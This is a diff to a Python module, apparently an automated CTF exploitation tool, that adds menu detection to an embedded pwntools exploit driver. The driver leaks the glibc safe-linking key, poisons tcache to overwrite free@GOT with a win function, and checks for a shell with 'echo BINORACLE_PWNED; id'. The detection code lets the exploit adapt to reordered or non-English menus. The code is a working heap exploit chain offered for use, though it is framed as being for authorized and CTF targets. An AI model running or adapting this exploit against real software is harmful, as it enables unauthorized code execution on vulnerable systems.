@@ -6,7 +6,9 @@ when glibc's allocator aborts (double free, corruption, invalid pointer, ...). F
 AUTHORIZED / CTF targets."""
 from __future__ import annotations
 
+import json
 import os
+import re
 import shutil
 import subprocess
 
@@ -56,11 +58,16 @@ def autoheap(binary: str) -> dict:
 # tcache bin sets its fd = mangle(NULL) = (&chunk >> 12), so `show` leaks that key directly;
 # poisoning then uses fd = key ^ target. Runs in the binoracle-pwn sandbox (ASLR off).
 _HEAP_SHELL_DRIVER = r'''
-import sys
+import sys, json
 from subprocess import STDOUT
 from pwn import *
 elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
-# Fail FAST: if a glibc abort kills the process mid-poison, the next sendlineafter("> ") would
+# Menu shape detected statically on the host (new/free/edit/show choice numbers + prompt). The
+# host injects it here; the defaults are the heapexp shape so the driver still works standalone.
+SPEC = json.loads(r"""__SPEC_JSON__""")
+NEW, FREE, EDIT, SHOW = SPEC.get("new", 1), SPEC.get("free", 2), SPEC.get("edit", 3), SPEC.get("show", 4)
+PROMPT = SPEC.get("prompt", "> ").encode()
+# Fail FAST: if a glibc abort kills the process mid-poison, the next sendlineafter(PROMPT) would
 # otherwise block until the outer docker timeout (200s). A short tube timeout makes it raise
 # quickly so we still print the stage/dbg diagnostic instead of hanging.
 context.timeout = 3
@@ -78,7 +85,6 @@ try:
     neigh_lazy = u64(elf.read(neigh, 8))     # initial GOT value from the ELF image = PLT stub
 except Exception:
     neigh_lazy = 0
-PROMPT = b"> "
 def choose(io, c, idx=None, data=None):
     io.sendlineafter(PROMPT, str(c).encode())
     if idx is not None:
@@ -89,34 +95,34 @@ try:
     io = process([elf.path], aslr=False, stderr=STDOUT)   # merge glibc aborts into the tube
     # Phase A -- leak the safe-linking key: new(0); free(0) (empty bin -> fd=mangle(NULL));
     # show(0) returns (&0 >> 12); then take chunk 0 back so the bin is empty again.
-    choose(io, 1, 0); choose(io, 2, 0)
-    choose(io, 4, 0)
+    choose(io, NEW, 0); choose(io, FREE, 0)
+    choose(io, SHOW, 0)
     key = u64(io.recv(8).ljust(8, b"\x00"))
-    choose(io, 1, 0)                        # re-allocate index 0 (tcache empty, count 0)
+    choose(io, NEW, 0)                       # re-allocate index 0 (tcache empty, count 0)
     def drain(t=0.25):                      # EOF-tolerant read: captures any glibc abort text
         try: return io.recv(timeout=t)
         except Exception: return b""
     # Phase B -- poison, instrumented step by step so we see WHERE it dies and WHAT glibc says.
     stage = "start"; dbg = b""
     try:
-        choose(io, 1, 1)                                            # new(1)
-        choose(io, 2, 1); choose(io, 2, 0)                          # free(1); free(0) -> count 2
-        choose(io, 3, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))  # poison fd(0)=mangle(free_got)
+        choose(io, NEW, 1)                                          # new(1)
+        choose(io, FREE, 1); choose(io, FREE, 0)                    # free(1); free(0) -> count 2
+        choose(io, EDIT, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))  # poison fd(0)=mangle(free_got)
         stage = "poisoned"; dbg += drain()
-        choose(io, 1, 2); stage = "malloc1"; dbg += drain()         # malloc -> chunk 0
-        choose(io, 1, 3); stage = "malloc2"; dbg += drain()         # malloc -> free@GOT
+        choose(io, NEW, 2); stage = "malloc1"; dbg += drain()       # malloc -> chunk 0
+        choose(io, NEW, 3); stage = "malloc2"; dbg += drain()       # malloc -> free@GOT
         # DIAG (decisive): read chunks[3][:8] BEFORE overwriting. If the poison landed, chunks[3]
         # IS free@GOT, whose current value is the real libc `free` (a 0x7f... pointer); a small or
         # zero value means malloc2 did NOT return free@GOT, so the poison missed the target.
         pre = 0
         try:
-            choose(io, 4, 3); pre = u64(io.recv(8).ljust(8, b"\x00"))
+            choose(io, SHOW, 3); pre = u64(io.recv(8).ljust(8, b"\x00"))
         except Exception:
             pass
         # *free@GOT = win AND restore free@GOT+8 (zeroed by the tcache key-clear on malloc2), so
         # win's first libc call (e.g. puts) resolves instead of jumping to NULL.
-        choose(io, 3, 3, p64(win) + p64(neigh_lazy)); stage = "wrote_win"; dbg += drain()
-        io.sendlineafter(PROMPT, b"2"); io.sendline(b"2")           # free(2) -> free@GOT -> win()
+        choose(io, EDIT, 3, p64(win) + p64(neigh_lazy)); stage = "wrote_win"; dbg += drain()
+        choose(io, FREE, 2)                                         # free(2) -> free@GOT -> win()
         stage = "triggered"; dbg += b" free_ptr_pre=%#x " % pre; dbg += io.recvrepeat(1.5)
         io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
     except Exception as e:
@@ -128,12 +134,78 @@ try:
         print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win))
     else:
         tail = dbg[-320:].decode("latin-1", "replace").replace("\n", " | ")
-        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x stage=%s dbg=%r"
-              % (key, free_got, win, stage, tail))
+        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x menu=%s stage=%s dbg=%r"
+              % (key, free_got, win, SPEC, stage, tail))
 except Exception as e:
     print("ERROR", repr(str(e)))
     sys.exit(1)
 '''
+
+
+# --- Menu-shape detection ------------------------------------------------------------------
+# The driver above targets a menu-driven tcache-UAF (new/free/edit/show). The heapexp sample
+# numbers them 1/2/3/4 with a "> " prompt, but other binaries reorder them, relabel them (often
+# in another language), use different separators ("1)" vs "1." vs "[1]") and a different prompt.
+# We recover the shape STATICALLY from the binary's own menu string and feed it to the driver,
+# so the exploit adapts instead of assuming heapexp's exact numbering.
+_OP_KEYWORDS = {
+    # order matters: first op whose keyword matches a label claims that option number
+    "new":  ("malloc", "alloc", "create", "new", "make", "nuevo", "crear", "reservar",
+             "anadir", "add"),
+    "free": ("free", "delete", "remove", "release", "liberar", "borrar", "eliminar",
+             "quitar", "del"),
+    "edit": ("edit", "modify", "fill", "write", "change", "update", "editar", "modificar",
+             "escribir", "rellenar", "cambiar"),
+    "show": ("show", "print", "view", "dump", "display", "list", "read", "ver", "mostrar",
+             "leer", "imprimir", "listar"),
+}
+_OPT_RE = re.compile(r"(\d{1,2})\s*[\)\.\:\-\]]\s*([A-Za-z][A-Za-z ]{1,24})")
+_PROMPT_RE = re.compile(r"[>\$#:»]+\s*$")
+
+
+def _ascii_strings(path: str, minlen: int = 4):
+    # Include \t \n \r in a run so a multi-line menu stored as ONE string (a single puts/printf
+    # with embedded newlines, the common case) stays intact; \0 and other control bytes still
+    # break runs, so distinct rodata strings remain separate.
+    try:
+        data = open(path, "rb").read()
+    except OSError:
+        return []
+    return [m.group().decode("latin-1")
+            for m in re.finditer(rb"[\x20-\x7e\x09\x0a\x0d]{%d,}" % minlen, data)]
+
+
+def _trailing_prompt(menu: str, last_end: int) -> str:
+    """The input prompt is usually the short token right after the last menu option, e.g.
+    '...4)show\n> '. Take the remainder after the last option; if it looks like a prompt
+    (ends in >/:/# or is short), use it; else fall back to '> '."""
+    tail = menu[last_end:].lstrip("\r\n")
+    first = tail.splitlines()[0].strip() if tail.strip() else ""
+    if first and (_PROMPT_RE.search(first) or len(first) <= 12):
+        return first + (" " if not first.endswith(" ") else "")
+    return "> "
+
+
+def detect_menu_spec(binary: str) -> dict | None:
+    """Recover {prompt, new, free, edit, show} from the binary's menu string, or None if no
+    single string maps all four operations. Pure static string parsing -- no container."""
+    for s in _ascii_strings(binary, 4):
+        matches = list(_OPT_RE.finditer(s))
+        if len(matches) < 3:
+            continue
+        numlabel = {int(m.group(1)): m.group(2).strip().lower() for m in matches}
+        ops: dict[str, int] = {}
+        for op, kws in _OP_KEYWORDS.items():
+            for n, lab in numlabel.items():
+                if n in ops.values():
+                    continue
+                if any(re.search(r"\b" + re.escape(k), lab) for k in kws):
+                    ops[op] = n
+                    break
+        if all(k in ops for k in ("new", "free", "edit", "show")) and len(set(ops.values())) == 4:
+            prompt = _trailing_prompt(s, matches[-1].end())
+            return {"prompt": prompt, **ops}
+    return None
 
 
 def _heap_shell_applicable(binary: str) -> bool:
@@ -159,13 +231,18 @@ def _heap_shell_applicable(binary: str) -> bool:
 
 
 def autoheap_shell(binary: str) -> dict:
-    """Drive a menu tcache-UAF (heapexp shape) to a verified shell via tcache poisoning +
-    free@GOT overwrite. Needs a `win` and a writable free@GOT (no-PIE). Runs in the
-    binoracle-pwn sandbox; degrades cleanly if Docker or the image is absent."""
+    """Drive a menu-driven tcache-UAF (new/free/edit/show) to a verified shell via tcache
+    poisoning + free@GOT overwrite. Needs a `win` and a writable free@GOT (no-PIE). The menu
+    shape (option numbers + prompt) is detected statically from the binary, so it adapts to
+    reordered/relabelled/non-English menus, not just heapexp. Runs in the binoracle-pwn
+    sandbox; degrades cleanly if Docker or the image is absent."""
     if not shutil.which("docker"):
         return {"ok": False, "note": "docker no disponible"}
     if not _heap_shell_applicable(binary):
         return {"ok": False, "note": "no aplicable (sin win/free): heap->shell requiere win + free@GOT"}
+    spec = detect_menu_spec(binary)
+    if spec is None:
+        return {"ok": False, "note": "no aplicable: no se detecto un menu new/free/edit/show en el binario"}
     try:
         img = subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
                              capture_output=True, timeout=15).returncode
@@ -179,7 +256,7 @@ def autoheap_shell(binary: str) -> dict:
     drv = os.path.join(d, ".binoracle_heap.py")
     try:
         with open(drv, "w") as f:
-            f.write(_HEAP_SHELL_DRIVER)
+            f.write(_HEAP_SHELL_DRIVER.replace("__SPEC_JSON__", json.dumps(spec)))
     except OSError as e:
         return {"ok": False, "note": f"no se pudo escribir el driver: {e}"}
     try:
@@ -198,6 +275,7 @@ def autoheap_shell(binary: str) -> dict:
     verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
     line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
     return {"ok": True, "verified": verified, "detail": line, "output": out[-600:],
+            "menu": spec,
             "note": "tcache-UAF -> free@GOT=win -> shell (sandbox)" if verified
                     else "no verificado (revisa alineacion/glibc o formato del menu)"}
 
